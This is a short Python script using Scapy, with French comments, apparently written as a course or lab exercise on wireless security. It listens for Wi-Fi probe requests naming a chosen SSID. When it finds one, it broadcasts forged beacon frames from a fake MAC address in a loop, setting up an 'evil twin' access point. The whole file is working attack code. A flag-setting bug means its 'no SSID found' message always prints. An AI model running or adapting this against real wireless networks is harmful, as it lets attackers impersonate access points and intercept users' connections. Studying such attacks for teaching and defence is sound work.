# Description : Script permettant de detecter une STA cherchant un SSID défini et de proposer un evil Twin
# Authors     : Géraud SILVESTI, Alexandre JAQUIER, Francesco MONTI
# Date        : 28.03.2023
# Usage       : 4_evilTwin.py -i <INTERFACE> -s <SSID>
# Source      : http://www.nicola-spanti.info/fr/documents/tutorials/computing/programming/python/scapy/search-ssid-with-probe-request.html
#             : https://www.thepythoncode.com/article/create-fake-access-points-scapy
#             : https://github.com/adamziaja/python/blob/master/probe_request_sniffer.py

from scapy.all import Dot11, Dot11Beacon, Dot11Elt, RadioTap, sendp, sniff
import argparse
from faker import Faker

BROADCAST = "ff:ff:ff:ff:ff:ff"

# Param nécessaire (à remplir) permettant de lancer le scan
parser = argparse.ArgumentParser(prog="Scapy SSID finder", description="SSID scan in prob request")
parser.add_argument("-i", "--interface", required=True, help="Interface to scan")
parser.add_argument("-s", "--ssid", required=True, help="Resarched SSID")
tab_args = parser.parse_args()

ssid_found = False

# Cherche un SSID correspondant
def find_ssid(packet):
    if packet.haslayer(Dot11Elt):
        #Check si c'est une probe request
        if packet.type == 0 and packet.subtype == 4:
            if packet.info.decode() == tab_args.ssid:
                print("\nSSID trouvé")
                ssid_found = True
                evil_twin_attack()


# Propose de lancer une attaque evil twin si un SSID correspondant est trouvé
def evil_twin_attack():
    #Creation fausse MAC addresse
    mac = Faker().mac_address()
    #Forge le paquet (mac addresse fausse + ssid)
    dot11 = Dot11(type=0, subtype=8, addr1=BROADCAST, addr2=mac, addr3=mac)
    ssid = Dot11Elt(ID="SSID", info=tab_args.ssid, len=len(tab_args.ssid))
    frame = RadioTap()/dot11/Dot11Beacon()/ssid

    print("Les paquets vont être envoyés et l'AP simulé CTRL+C pour annuler...")
    sendp(frame, iface=tab_args.interface, loop=1)

# On sniff le réseau sur l'interface choisie
sniff(iface=tab_args.interface, prn=find_ssid, timeout=30)
if ssid_found == False:
    print("Aucun SSID n'a été trouvé")